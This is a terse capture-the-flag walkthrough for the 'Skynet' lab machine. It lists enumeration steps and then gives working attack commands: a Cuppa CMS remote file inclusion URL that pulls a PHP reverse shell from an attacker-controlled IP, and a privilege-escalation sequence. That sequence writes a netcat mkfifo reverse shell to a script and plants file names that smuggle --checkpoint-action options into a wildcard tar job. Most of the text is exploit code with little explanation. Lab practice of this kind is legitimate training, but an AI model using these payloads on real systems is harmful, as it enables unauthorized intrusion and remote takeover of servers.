# Skynet

* Smb share enumeration
* email login
* Cuppa CMS RFI


```bash
http://10.10.44.199/45kra24zxs28v3yd/administrator//alerts/alertConfigField.php?urlConfig=http://10.11.14.121/php-reverse-shell.php
```


```bash
cd /var/www/html
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.11.14.121 3302 >/tmp/f" > shell.sh
touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
touch "/var/www/html/--checkpoint=1"
```

